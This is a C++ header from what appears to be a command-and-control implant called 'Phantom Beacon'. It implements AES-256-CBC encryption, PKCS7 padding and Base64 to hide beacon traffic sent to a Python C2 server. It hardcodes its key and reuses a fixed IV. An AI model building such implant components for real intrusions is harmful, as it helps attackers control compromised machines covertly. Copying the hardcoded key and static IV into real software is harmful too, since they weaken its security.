#pragma once
// ============================================================================
//  crypto.h — Phantom Beacon Cryptographic Layer
//  ──────────────────────────────────────────────
//  AES-256-CBC encryption/decryption using Windows Native CNG (BCrypt).
//  Zero external dependencies — uses only bcrypt.dll which ships with Windows.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <bcrypt.h>
    #pragma comment(lib, "bcrypt.lib")
    #ifndef NT_SUCCESS
    #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
    #endif
#else
    #include <openssl/evp.h>
    #include <openssl/err.h>
    typedef unsigned char BYTE;
#endif
#include <vector>
#include <string>
#include <cstring>


namespace crypto {

// ── Key Material ────────────────────────────────────────────────────────────
// Must match the Python C2 server's AES_KEY and AES_IV exactly.
// In production these would be negotiated per-session or embedded at compile time.
static const BYTE AES_KEY[] = "PhantomC2_SecretKey_32bytes_Long";  // 32 bytes
static const BYTE AES_IV[]  = "PhantomC2_IV16b";                   // 16 bytes (block size)

constexpr ULONG KEY_LEN   = 32;
constexpr ULONG BLOCK_LEN = 16;

// ── PKCS7 Padding ──────────────────────────────────────────────────────────

inline std::vector<BYTE> pkcs7_pad(const std::vector<BYTE>& data) {
    size_t padLen = BLOCK_LEN - (data.size() % BLOCK_LEN);
    std::vector<BYTE> padded = data;
    padded.insert(padded.end(), padLen, static_cast<BYTE>(padLen));
    return padded;
}

inline std::vector<BYTE> pkcs7_unpad(const std::vector<BYTE>& data) {
    if (data.empty()) return {};
    BYTE padLen = data.back();
    if (padLen == 0 || padLen > BLOCK_LEN) return data;
    // Verify padding bytes
    for (size_t i = data.size() - padLen; i < data.size(); ++i) {
        if (data[i] != padLen) return data;
    }
    return std::vector<BYTE>(data.begin(), data.end() - padLen);
}

// ── Base64 Encode/Decode ───────────────────────────────────────────────────
// Minimal implementation — avoids dependency on CryptBinaryToStringA

static const char B64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

inline std::string base64_encode(const std::vector<BYTE>& data) {
    std::string out;
    out.reserve(((data.size() + 2) / 3) * 4);
    for (size_t i = 0; i < data.size(); i += 3) {
        uint32_t n = (static_cast<uint32_t>(data[i]) << 16);
        if (i + 1 < data.size()) n |= (static_cast<uint32_t>(data[i + 1]) << 8);
        if (i + 2 < data.size()) n |= static_cast<uint32_t>(data[i + 2]);
        out += B64_TABLE[(n >> 18) & 0x3F];
        out += B64_TABLE[(n >> 12) & 0x3F];
        out += (i + 1 < data.size()) ? B64_TABLE[(n >> 6) & 0x3F] : '=';
        out += (i + 2 < data.size()) ? B64_TABLE[n & 0x3F] : '=';
    }
    return out;
}

inline std::vector<BYTE> base64_decode(const std::string& enc) {
    // Build reverse table
    int T[256];
    memset(T, -1, sizeof(T));
    for (int i = 0; i < 64; ++i) T[static_cast<unsigned char>(B64_TABLE[i])] = i;

    std::vector<BYTE> out;
    out.reserve(enc.size() * 3 / 4);
    uint32_t val = 0;
    int bits = -8;
    for (unsigned char c : enc) {
        if (T[c] == -1) continue;  // skip '=' and garbage
        val = (val << 6) | T[c];
        bits += 6;
        if (bits >= 0) {
            out.push_back(static_cast<BYTE>((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return out;
}

// ── AES-256-CBC Encrypt ────────────────────────────────────────────────────

inline std::string encrypt(const std::string& plaintext) {
#ifdef _WIN32
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;
    std::string result;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(status)) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
        (PUCHAR)AES_KEY, KEY_LEN, 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    std::vector<BYTE> padded = pkcs7_pad(
        std::vector<BYTE>(plaintext.begin(), plaintext.end()));

    BYTE iv[BLOCK_LEN];
    memcpy(iv, AES_IV, BLOCK_LEN);

    ULONG cbCiphertext = 0;
    status = BCryptEncrypt(hKey, padded.data(), (ULONG)padded.size(),
        nullptr, iv, BLOCK_LEN, nullptr, 0, &cbCiphertext, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    {
        std::vector<BYTE> ciphertext(cbCiphertext);
        memcpy(iv, AES_IV, BLOCK_LEN);

        status = BCryptEncrypt(hKey, padded.data(), (ULONG)padded.size(),
            nullptr, iv, BLOCK_LEN, ciphertext.data(), cbCiphertext, &cbCiphertext, 0);
        if (NT_SUCCESS(status)) {
            ciphertext.resize(cbCiphertext);
            result = base64_encode(ciphertext);
        }
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
#else
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";

    std::vector<BYTE> padded = pkcs7_pad(std::vector<BYTE>(plaintext.begin(), plaintext.end()));
    std::vector<BYTE> ciphertext(padded.size() + BLOCK_LEN);
    int len = 0;
    int ciphertext_len = 0;

    BYTE iv[BLOCK_LEN];
    memcpy(iv, AES_IV, BLOCK_LEN);

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, AES_KEY, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    EVP_CIPHER_CTX_set_padding(ctx, 0); // We do our own padding

    if (1 != EVP_EncryptUpdate(ctx, ciphertext.data(), &len, padded.data(), padded.size())) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    ciphertext_len = len;

    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len)) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);

    ciphertext.resize(ciphertext_len);
    return base64_encode(ciphertext);
#endif
}

// ── AES-256-CBC Decrypt ────────────────────────────────────────────────────

inline std::string decrypt(const std::string& ciphertext_b64) {
#ifdef _WIN32
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;
    std::string result;

    std::vector<BYTE> ciphertext = base64_decode(ciphertext_b64);
    if (ciphertext.empty()) return "";

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(status)) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
        (PUCHAR)AES_KEY, KEY_LEN, 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    BYTE iv[BLOCK_LEN];
    memcpy(iv, AES_IV, BLOCK_LEN);

    ULONG cbPlaintext = 0;
    status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(),
        nullptr, iv, BLOCK_LEN, nullptr, 0, &cbPlaintext, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    {
        std::vector<BYTE> plaintext(cbPlaintext);
        memcpy(iv, AES_IV, BLOCK_LEN);

        status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(),
            nullptr, iv, BLOCK_LEN, plaintext.data(), cbPlaintext, &cbPlaintext, 0);
        if (NT_SUCCESS(status)) {
            plaintext.resize(cbPlaintext);
            auto unpadded = pkcs7_unpad(plaintext);
            result = std::string(unpadded.begin(), unpadded.end());
        }
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
#else
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";

    std::vector<BYTE> ciphertext = base64_decode(ciphertext_b64);
    if (ciphertext.empty()) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }

    std::vector<BYTE> plaintext(ciphertext.size() + BLOCK_LEN);
    int len = 0;
    int plaintext_len = 0;

    BYTE iv[BLOCK_LEN];
    memcpy(iv, AES_IV, BLOCK_LEN);

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, AES_KEY, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    EVP_CIPHER_CTX_set_padding(ctx, 0);

    if (1 != EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), ciphertext.size())) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    plaintext_len = len;

    if (1 != EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len)) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    plaintext_len += len;
    EVP_CIPHER_CTX_free(ctx);

    plaintext.resize(plaintext_len);
    auto unpadded = pkcs7_unpad(plaintext);
    return std::string(unpadded.begin(), unpadded.end());
#endif
}

}  // namespace crypto
